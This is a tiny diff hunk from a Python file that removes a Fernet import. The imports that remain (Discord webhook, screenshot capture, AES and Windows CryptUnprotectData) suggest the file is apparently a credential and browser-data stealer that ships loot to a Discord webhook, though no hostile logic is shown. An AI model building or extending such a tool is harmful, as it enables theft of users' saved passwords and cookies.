@@ -15,7 +15,6 @@ from zipfile import ZipFile
 
 import requests
 from Crypto.Cipher import AES
-from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
